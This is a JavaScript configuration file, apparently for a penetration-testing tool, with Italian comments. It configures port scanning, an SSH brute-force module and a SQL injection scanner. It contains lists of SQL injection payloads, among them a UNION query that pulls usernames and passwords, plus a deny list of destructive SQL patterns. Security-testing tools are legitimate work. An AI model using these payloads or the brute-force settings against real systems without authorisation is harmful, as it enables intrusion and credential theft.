// src/config/index.js
require('dotenv').config();

// === Helper per parsing sicuro ===
function parseIntEnv(envVar, defaultValue) {
    const value = parseInt(process.env[envVar] || defaultValue, 10);
    return isNaN(value) ? defaultValue : value;
}

function parseBoolEnv(envVar, defaultValue) {
    const value = process.env[envVar];
    if (value === undefined) return defaultValue;
    return value.toLowerCase() === 'true';
}

// === Configurazione generale del tool ===
const config = {
    port: parseIntEnv('PORT', 3000),
    environment: process.env.NODE_ENV || 'development',

    // === Sicurezza e CORS ===
    security: {
        maxConnectionsPerIP: parseIntEnv('MAX_CONNECTIONS_PER_IP', 10),
        maxSessionsPerIP: parseIntEnv('MAX_SESSIONS_PER_IP', 3),
        sessionTimeout: parseIntEnv('SESSION_TIMEOUT', 30 * 60 * 1000),
        allowedOrigins: process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : ['http://localhost:3000']
    },

    // === Logging ===
    logging: {
        level: process.env.LOG_LEVEL || 'info',
        directory: './logs',
    },

    // === Vulnerabilità CVE/NVD ===
    nvd: {
        apiKey: process.env.NIST_API_KEY || 'INSERISCI_LA_TUA_CHIAVE',
        baseUrl: 'https://services.nvd.nist.gov/rest/json/cves/2.0',
    },

    // === Timeout scansioni ===
    scan_timeouts: {
        tcp: { 1: 5000, 2: 2500, 3: 1250, 4: 500, 5: 250 },
        udp: { 1: 3000, 2: 2000, 3: 1500, 4: 1000, 5: 500 },
        banner: 2000,
        http: 2000,
        postgres: 2000
    },

    // === Limiti scansioni ===
    scan_limits: {
        tcpConcurrency: parseIntEnv('SCAN_TCP_CONCURRENCY', 200),
        udpConcurrency: parseIntEnv('SCAN_UDP_CONCURRENCY', 50),
        hostDiscoveryConcurrency: parseIntEnv('SCAN_HOST_DISCOVERY_CONCURRENCY', 255),
    },

    // === Network Mapping ===
    network_mapping: {
        default_timeout: parseIntEnv('NETWORK_MAP_TIMEOUT', 5000),
        max_concurrent_hosts: parseIntEnv('NETWORK_MAP_CONCURRENT_HOSTS', 50),
        port_scan_timeout: parseIntEnv('PORT_SCAN_TIMEOUT', 2000)
    },

    // === SSH Brute-Force Tool ===
    ssh_tool: {
        port: parseIntEnv('SSH_TOOL_PORT', 3001),
        rate_limit_delay: parseIntEnv('SSH_RATE_LIMIT_DELAY', 750),
        connection_timeout: parseIntEnv('SSH_CONNECTION_TIMEOUT', 8000),
        max_concurrent_connections: parseIntEnv('SSH_MAX_CONCURRENT_CONNECTIONS', 5),
        max_attempts_per_session: parseIntEnv('SSH_MAX_ATTEMPTS_PER_SESSION', 1000),
        log_dir: process.env.SSH_LOG_DIR || './logs/ssh',
        audit_log_path: process.env.SSH_AUDIT_LOG_PATH || './logs/ssh/ssh_audit.log',
        error_log_path: process.env.SSH_ERROR_LOG_PATH || './logs/ssh/ssh_errors.log',
        algorithms: {
            kex: [
                'curve25519-sha256@libssh.org',
                'ecdh-sha2-nistp384',
                'ecdh-sha2-nistp521',
                'diffie-hellman-group-exchange-sha256',
                'diffie-hellman-group16-sha512'
            ],
            serverHostKey: [
                'ssh-ed25519',
                'ecdsa-sha2-nistp521',
                'rsa-sha2-512',
                'rsa-sha2-256'
            ],
            cipher: [
                'chacha20-poly1305@openssh.com',
                'aes256-gcm@openssh.com',
                'aes128-gcm@openssh.com',
                'aes256-ctr',
                'aes192-ctr',
                'aes128-ctr'
            ],
            hmac: [
                'hmac-sha2-256-etm@openssh.com',
                'hmac-sha2-512-etm@openssh.com'
            ]
        },
        error_patterns: {
            'All configured authentication methods failed': 'Credenziali errate',
            'Connection timed out': 'Timeout connessione',
            'Handshake failed': 'Handshake SSH fallito',
            'ECONNREFUSED': 'Connessione rifiutata',
            'EHOSTUNREACH': 'Host non raggiungibile',
            'Network is unreachable': 'Rete non raggiungibile',
            'Permission denied': 'Permesso negato',
            'Too many authentication failures': 'Troppi tentativi',
            'Host key verification failed': 'Chiave host non verificata'
        },
        security: {
            session_timeout: parseIntEnv('SSH_SESSION_TIMEOUT', 60 * 60 * 1000),
            require_secure_connection: parseBoolEnv('SSH_REQUIRE_SECURE_CONNECTION', false),
            log_all_attempts: parseBoolEnv('SSH_LOG_ALL_ATTEMPTS', true)
        }
    },

    // === SQL Injection ===
    sql_injection: {
        timeout: parseIntEnv('SQL_INJECTION_TIMEOUT', 10000),
        max_concurrent_scans: parseIntEnv('SQL_INJECTION_MAX_CONCURRENT', 3),
        safe_mode: parseBoolEnv('SQL_INJECTION_SAFE_MODE', true),
        user_agent: process.env.SQL_INJECTION_USER_AGENT || 'DeimosSecurityScanner/1.0',
        rate_limit: {
            windowMs: parseIntEnv('SQL_INJECTION_RATE_LIMIT_WINDOW', 60000),
            max: parseIntEnv('SQL_INJECTION_RATE_LIMIT_MAX', 30),
        },
		  payloads: {
			basic: [
				"' OR '1'='1",
				"' OR 1=1 --",
				"' OR '1'='1' /*",
				"' OR 'x'='x",
				"' OR 1=1#"
			],
			union: [
				"' UNION SELECT NULL--",
				"' UNION SELECT username, password FROM users--",
				"' UNION SELECT 1,2,3--"
			],
			time: [
				"'; WAITFOR DELAY '0:0:5'--",
				"'; SELECT pg_sleep(5)--",
				"' || sleep(5)--",
				"\" || sleep(5)--"
			],
			error: [
				"'\"",
				"' OR '' = '",
				"' OR 1=1; --"
			],
			boolean: [
			  "' OR '1'='1' -- ",
			  "' OR '1'='2' -- ",
			  "' OR 1=1 -- ",
			  "' OR 1=2 -- ",
			  "') OR ('1'='1",
			  "') OR ('1'='2"
			]
		  },
        destructive_patterns: [
            'DROP TABLE',
            'DELETE FROM',
            'TRUNCATE TABLE',
            'xp_cmdshell',
            'SHUTDOWN'
        ]
    }
};

module.exports = config;
